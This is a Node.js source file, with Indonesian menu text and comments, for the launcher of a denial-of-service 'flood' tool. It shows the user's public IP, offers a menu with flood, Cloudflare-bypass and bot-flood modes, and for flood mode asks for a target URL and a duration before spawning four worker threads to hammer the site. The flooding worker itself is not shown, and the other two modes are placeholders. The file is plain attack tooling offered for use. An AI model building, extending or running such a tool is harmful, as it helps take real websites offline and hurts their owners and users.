const readline = require("readline");
const os = require("os");
const https = require("https");
const { Worker } = require("worker_threads");

// Ambil IP publik
function getPublicIP(callback) {
  https.get("https://api.ipify.org?format=json", (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => {
      try {
        const ip = JSON.parse(data).ip;
        callback(ip);
      } catch {
        callback("Tidak diketahui");
      }
    });
  }).on("error", () => {
    callback("Gagal mengambil IP");
  });
}

// Fungsi buat jalankan worker flood
function runFloodWorkers(target, duration, workerCount = 4) {
  console.log(`Menjalankan flood dengan ${workerCount} workers...`);
  let total = 0, success = 0, failed = 0;

  const workers = [];
  for (let i = 0; i < workerCount; i++) {
    const worker = new Worker("./worker.js", {
      workerData: { target, duration }
    });

    worker.on("message", (msg) => {
      if (msg.done) {
        console.log(`Worker selesai: Total=${msg.total}, Sukses=${msg.success}, Gagal=${msg.failed}`);
      } else {
        total += msg.total;
        success += msg.success;
        failed += msg.failed;
        // Bisa kamu tambahkan update status secara realtime juga
      }
    });

    worker.on("error", (err) => {
      console.error(`Worker error: ${err}`);
    });

    workers.push(worker);
  }
}

// Menu utama
function showMenu(ip) {
  const platform = os.platform();
  const deviceType = /android/.test(platform) ? "Android/Termux" : platform;

  console.clear();
  console.log("==============================");
  console.log("     TOOLS JS INFORMATION     ");
  console.log("==============================");
  console.log("IP Address  :", ip);
  console.log("Device      :", deviceType);
  console.log("==============================");
  console.log("1. Mode Flood");
  console.log("2. Bypass Cloudflare");
  console.log("3. Bot Flood");
  console.log("0. Exit");
  console.log("==============================");

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question("Pilih mode: ", (input) => {
    switch (input) {
      case '1':
        rl.question("Target URL: ", (url) => {
          rl.question("Durasi (detik): ", (time) => {
            runFloodWorkers(url, parseInt(time), 4);
            rl.close();
          });
        });
        break;

      case '2':
        console.log("Mode CF Bypass belum tersedia.");
        rl.close();
        break;

      case '3':
        console.log("Mode Bot Flood belum tersedia.");
        rl.close();
        break;

      case '0':
        console.log("Keluar...");
        rl.close();
        break;

      default:
        console.log("Pilihan tidak valid.");
        rl.close();
    }
  });
}

getPublicIP((ip) => {
  showMenu(ip);
});